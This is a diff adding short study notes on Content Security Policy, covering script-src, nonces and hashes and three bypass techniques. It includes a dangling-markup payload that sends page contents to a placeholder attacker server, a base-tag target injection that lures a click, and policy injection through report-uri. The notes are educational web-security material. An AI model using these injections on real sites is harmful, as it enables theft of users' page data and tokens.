@@ -1,0 +1,44 @@
+CSP
+----
+
+What is CSP?
+-> CSP is a browser security mechanism that aims to mitigate XSS and some other attacksç
+-> To enable CSP, a response needs to include an HTTP response header called "Content-Security-Policy" with a corresponding value.
+
+* script-src 'self'
+-> This will only allow scripts to be loaded from the same origin as the page itself.
+
+* script-src https://scripts.normal-website.com
+-> This will only allow scripts to be loaded from a specific domain.
+
+* CSP also provides two ways of specifying trusted resouces: Nonces and hashes
+-> The CSP directive can specify a nonce ( a random value ) and the same value must be used in the tag that loads a script. If the value does not match, then the script will not be executed. To be effective, the nonce must be securely generated on each page load and not be guessable by an attacker.
+-> The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not be executed. If the content of the script ever changes, then you will need to update the hash that is specified in the directive.
+
+
+Dangling Mark-Up Attack
+* Dangling Markup is a technique to steal the contents of the page without script by using resources such as images to send data to a remote location controlled by hacker.
+* It is useful when CSP blocks reflected XSS.
+
+Example payload:
+-> <img src="https://evilserver/?
+
+We deliberately inject half open tag so the code between the injection point and the next double quote will be sent to hacker.
+
+Bypassing a restricive CSP with base target
+
+CSP: default-src 'none'; base-uri 'none';
+-> The above CSP will block the image vector with the open src attribute becaıse the policy will not load any images resources or other sub resources.
+-> We can use base tag to bypass this restriction.
+-> Using the target attribute on the base tag, we can change the window name of every link on the page.
+-> By injection an incomplete target attribute,  the window name will be set with all thge markup after the injection until the corresponding quote on every link on the page.
+-> In order for an attacker to retrieve the data, the victim simply neds to click the link 
+
+Example Injection:
+<a href=http://dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="blah
+
+* CSP can also be bypassed with policy injection.
+-> We may encounter a website that reflects input into actual policy, most likely in a report-uri directive. 
+-> If the site reflects a parameter that we (hacker) can control, we can inject a semicolon to add your own CSP directives.
+-> Usually, this report-uri directive is the final one, so we need to overwrite the existing directives in order to exploit this vulnerability to bypass the policy.
+
